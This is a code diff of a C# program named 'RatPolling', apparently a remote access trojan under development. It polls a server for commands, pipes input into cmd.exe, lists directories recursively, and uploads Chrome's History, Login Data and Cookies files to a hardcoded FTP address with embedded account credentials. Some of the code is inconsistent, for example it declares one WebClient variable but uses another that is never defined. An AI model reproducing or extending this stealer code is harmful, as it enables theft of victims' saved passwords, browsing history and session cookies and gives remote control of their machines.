@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Threading;
@@ -7,10 +8,10 @@ namespace RatPolling
 {
     class Program
     {
-        private static bool ScanDir(string Path)
+        private static bool ScanDir(string Path, StreamWriter f)
         {
-            try 
-            { 
+            try
+            {
                 string[] dirs = Directory.GetDirectories(Path);
 
                 if (dirs.Length == 0)
@@ -22,21 +23,14 @@ namespace RatPolling
                     foreach (string dir in dirs)
                     {
                         Console.WriteLine(dir);
-                        ScanDir(dir);
+                        f.WriteLine(dir);
+                        ScanDir(dir, f);
                     }
                 }
-
-             
-            }
-            catch(System.UnauthorizedAccessException e)
-            {
-                Console.WriteLine("Error! "+ e);
-
             }
             catch
             {
-                Console.WriteLine("Error! Other" );
-
+                Console.WriteLine("Error!");
             }
             return true;
         }
@@ -45,10 +39,6 @@ namespace RatPolling
         {
             String UserName = "TestPC";
             string CurrentUser = Environment.UserName;
-
-
-            ScanDir("C:\\Users");
-
 
             Console.WriteLine("Connection..." + CurrentUser);
             while (true)
@@ -66,54 +56,97 @@ namespace RatPolling
                     reader.Close();
 
 
-               
-                string[] commands = s.Split('|');
 
-                foreach (var command in commands)
-                {
-                    System.Console.WriteLine($"{command}");
+                    string[] argsCommand = { };
+                    string[] commands = s.Split('|');
+                    string[] atrs = { };
 
-                    if (command == "getGoogleData" + "=" + UserName)
+                    foreach (var command in commands)
                     {
-
-                        String pathToGoogleCookie = "C:\\Users\\" + CurrentUser + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\";
-
-                        if (System.IO.Directory.Exists(pathToGoogleCookie))
+                        if (command != "")
                         {
-                            try
+                            argsCommand = command.Split('-');
+                            atrs = argsCommand[1].Split('=');
+                            Console.WriteLine(argsCommand[0]);
+
+
+                            const string com = @"mkdir sd";
+                            var process = new Process
                             {
-                                using (var clienst = new WebClient())
+                                StartInfo = new ProcessStartInfo
                                 {
-                                    client.Credentials = new NetworkCredential("u0777445", "RL7srYg_");
-                                    client.UploadFile("ftp://31.31.196.203/History" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, pathToGoogleCookie + "History");
-                                    client.UploadFile("ftp://31.31.196.203/Login.txt" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, pathToGoogleCookie + "Login Data");
-                                    client.UploadFile("ftp://31.31.196.203/Cookies.txt" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, pathToGoogleCookie + "Cookies");
+                                    FileName = "cmd.exe",
+                                    RedirectStandardInput = true,
+                                    UseShellExecute = false
+
+                                }
+                            };
+                            process.Start();
+
+                            using (StreamWriter pWriter = process.StandardInput)
+                            {
+                                if (pWriter.BaseStream.CanWrite)
+                                {
+                                    StreamWriter f = new StreamWriter(@"C:\Users\79242\source\repos\RatPolling\RatPolling\line.txt");
+                                    foreach (var line in com.Split('\n'))
+                                    {
+                                        
+                                        pWriter.WriteLine(line);
+                                        f.WriteLine(line);
+                                    }
+                                    f.Close();
                                 }
                             }
-                            catch (System.Net.WebException e)
+
+                            if (argsCommand[0] == "getFolder")
                             {
-                                    Console.WriteLine("[-] ERROR: FTP Connection error.");
+                                StreamWriter f = new StreamWriter(@"C:\Users\79242\source\repos\RatPolling\RatPolling\test.txt");
+                                ScanDir(atrs[0], f);
+                                f.Close();
+                                client.Credentials = new NetworkCredential("u0777445", "RL7srYg_");
+                                client.UploadFile("ftp://31.31.196.203/logDirScan" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, @"C:\Users\79242\source\repos\RatPolling\RatPolling\test.txt");
+                            }
+
+                            if (argsCommand[0] == "getGoogleData")
+                            {
+                                String pathToGoogleCookie = "C:\\Users\\" + CurrentUser + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\";
+                                if (System.IO.Directory.Exists(pathToGoogleCookie))
+                                {
+                                    try
+                                    {
+                                        using (var clienst = new WebClient())
+                                        {
+                                            client.Credentials = new NetworkCredential("u0777445", "RL7srYg_");
+                                            client.UploadFile("ftp://31.31.196.203/History" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, pathToGoogleCookie + "History");
+                                            client.UploadFile("ftp://31.31.196.203/Login.txt" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, pathToGoogleCookie + "Login Data");
+                                            client.UploadFile("ftp://31.31.196.203/Cookies.txt" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, pathToGoogleCookie + "Cookies");
+                                        }
+                                    }
+                                    catch (System.Net.WebException e)
+                                    {
+                                        Console.WriteLine("[-] ERROR: FTP Connection error.");
+                                    }
                                 }
-                           
+                                Console.WriteLine("[+] Data of ftp server." + pathToGoogleCookie);
+                            }
+
                         }
 
-                        Console.WriteLine("[+] Data of ftp server." + pathToGoogleCookie);
                     }
-                }
                     Console.WriteLine("[-] WARNING: The response returned null.");
                 }
                 catch (System.Net.WebException e)
                 {
                     Console.WriteLine("[-] ERROR: Connection error.");
                 }
-               
+
                 Thread.Sleep(2000);
 
 
             }
 
 
-            
+
 
 
 
@@ -122,7 +155,7 @@ namespace RatPolling
 
         }
 
-     
+
 
     }
 }
